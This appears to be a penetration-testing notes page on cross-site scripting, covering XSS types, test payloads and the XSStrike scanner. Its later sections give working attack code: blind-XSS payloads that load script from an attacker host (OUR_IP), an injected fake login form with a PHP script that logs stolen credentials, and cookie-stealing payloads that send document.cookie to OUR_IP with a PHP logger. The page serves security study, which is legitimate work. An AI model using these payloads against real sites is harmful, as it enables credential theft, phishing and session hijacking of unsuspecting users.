---
layout: default
title: XSS
permalink: /Web/xss/
---
# XSS
XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side.
- A basic example of an XSS attack is having the target user unwittingly send their session cookie to the attacker's web server.
- Another example is having the target's browser execute API calls that lead to a malicious action, like changing the user's password to a password of the attacker's choosing.
- There are many other types of XSS attacks, from Bitcoin mining to displaying ads.

As XSS attacks execute JavaScript code within the browser, we are limited to the browser's JS engine (i.e., V8 in Chrome). We cannot execute system-wide JavaScript code to do something like system-level code execution. In modern browsers, we are also limited to the same domain of the vulnerable website. But if we identify a binary vulnerability in a web browser (e.g., a Heap overflow in Chrome), we can utilize an XSS vulnerability to execute a JavaScript exploit on the target's browser, which eventually breaks out of the browser's sandbox and executes code on the user's machine.
<!--
| Type                        | Description                                                                                                                                                                           |
|-----------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Stored (Persistent) XSS     | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments).                         |
| Reflected (Non-Persistent) XSS | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message).                  |
| DOM-based XSS               | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags). |
-->
<table>
  <thead>
    <tr>
      <th>Type</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Stored (Persistent) XSS</td>
      <td>The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments).</td>
    </tr>
    <tr>
      <td>Reflected (Non-Persistent) XSS</td>
      <td>Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message).</td>
    </tr>
    <tr>
      <td>DOM-based XSS</td>
      <td>Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags).</td>
    </tr>
  </tbody>
</table>

These attacks can be used for defacing, phishing or session hijacking attacks.

## Testing Payloads
```
<script>alert(window.origin)</script>
```
*Note: Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one.*

<br>As some modern browsers may block the `alert()` JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is `<plaintext>`, which will stop rendering the HTML code that comes after it and display it as plaintext. Another easy-to-spot payload is `<script>print()</script>` that will pop up the browser print dialog, which is unlikely to be blocked by any browsers.
If the `<script>` tags are not allowed, we can use `<img src="" onerror=alert(window.origin)>`

### Automated Discovery
Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or ZAP) have various capabilities for detecting all three types of XSS vulnerabilities.

#### XSS Strike
```
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
```
```
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

### Manual Discovery

We can find huge lists of XSS payloads online, like the one on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in [PayloadBox](https://github.com/payloadbox/xss-payload-list). We can then begin testing these payloads one by one by copying each one and adding it in our form, and seeing whether an alert box pops up, but it is unefficient.<br>
The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code. If we understand precisely how our input is being handled all the way until it reaches the web browser, we can write a custom payload that should work with high confidence.

## Reflected XSS
If this XSS vulnerability is Non-Persistent, how would we target victims with it?
This depends on which HTTP request is used to send our input to the server.
If our request was a GET request, the parameters and data is part of the URL, so to target a user, we can send them a URL containing our payload.
```
http://94.237.61.242:53290/index.php?task=payload
```

## DOM XSS
DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).
There will be no network traffic and the input parameter in the URL is using a hashtag '#' for the item we added, which means that the parameter is a client-side parameter that is completely processed on the browser.
To target a user with this DOM XSS vulnerability, we can once again copy the URL from the browser and share it with them, and once they visit it, the JavaScript code should execute. 

# Blind XSS Detection
A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to. Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins).
Let's say there are multiple inputs. We won't find the vulnerable one with XSS Strike. Although we cannot see how the output is handled or which fields may execute our code, we can try to load a remote scripts and e.g. change each script name or loacation to the name of the field which requests it.
```
<script src="http://OUR_IP/username"></script>
```
So if we get a request for `/username`, then we know that the `username` field is vulnerable to XSS.
Then we can try different payloads for each field. We can get inspiration from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):
```
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
We can use e.g. netcat or php for listening:
```
sudo php -S 0.0.0.0:80
```
So:
```
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
```
# Phishing
HTML code for basic login form:
```
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
```
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```
To write HTML code to the vulnerable page, we can use the `document.write()` JavaScript function:
```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
We can use `document.getElementById().remove()` or `<!--` at the end to clean up the look of the page and make the login more believable.

After that spin up our listening web server and we can put this `index.php` file in the webroot to save the credentials nicely:
```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
*Note: After submitting the creds, the user will be redirected to the page itself, so the victim thinks that he/she just logged in.*

# Session Hijacking
As usual, we can use [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):
```
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
We can put `new Image().src='http://OUR_IP/index.php?c='+document.cookie` into `script.js` where our webserver is runnig.
Then load this script from the vulnerable field:
```
<script src=http://OUR_IP/script.js></script>
```
We can put this php script into our webroot folder as `index.php` to save the cookie value:
```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
After we get a cookie, we can open our browser, navigate to the login page and put the cookie in the 'Storage' bar in the Developer Tool. (Click '+' button on the top right corner and add our cookie name and value.
